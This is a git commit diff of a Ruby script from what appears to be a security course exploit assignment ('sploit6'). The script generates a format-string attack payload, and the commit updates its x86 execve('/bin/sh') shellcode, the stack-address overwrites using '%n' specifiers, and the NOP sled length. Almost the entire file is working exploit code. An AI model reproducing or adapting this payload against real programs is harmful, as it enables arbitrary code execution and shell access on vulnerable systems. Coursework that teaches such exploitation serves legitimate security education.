0cda0a5d0f94b92b6773b6b727d09e03e172d7ef
LRParser <lrparser@server.fake>
2013-07-16 21:35:04 -0400

    Update File generator for 6

--- project2/sploit6/generate6File.rb
+++ project2/sploit6/generate6File.rb
@@ -1,19 +1,22 @@
 #!/usr/bin/env ruby
 
 shellcode = ""
-shellcode += "\xeb\x1c\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43"
-shellcode += "\x0c\x89\xc2\x8d\x4b\x08\xb0\x0b\xcd\x80\x31\xdb\x89"
-shellcode += "\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff/bin/sh"
+shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46"
+shellcode += "\x07\x89\x4c\x0c\xb0\x0b"
+shellcode += "\x89\xf3\x8d\x4e\x08\x8d\x56"
+shellcode += "\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
 addr_overwrite = ""
-addr_overwrite += "\xfc\xfd\xff\xbfjunk"
-addr_overwrite += "\xfd\xfd\xff\xbfjunk"
-addr_overwrite += "\xfe\xfd\xff\xbfjunk"
-addr_overwrite += "\xff\xfd\xff\xbf"
+addr_overwrite += "\x8c\xfd\xff\xbfjunk"
+addr_overwrite += "\x8d\xfd\xff\xbfjunk"
+addr_overwrite += "\x8e\xfd\xff\xbfjunk"
+addr_overwrite += "\x8f\xfd\xff\xbf"
 addr_overwrite += "%4x%4x"
-addr_overwrite += "%201x%n"
-addr_overwrite += "%8x%n"
-addr_overwrite += "%49151x%n"
-/addr_overwrite += "%10x%n"
-/
-puts addr_overwrite + "\x90" * 50 + shellcode
+addr_overwrite += "%214x%n"
+addr_overwrite += "%250x%n"
+addr_overwrite += "%259x%n"
+addr_overwrite += "%280000x%n"
+
+puts addr_overwrite + "\x90" * 140 + shellcode
+
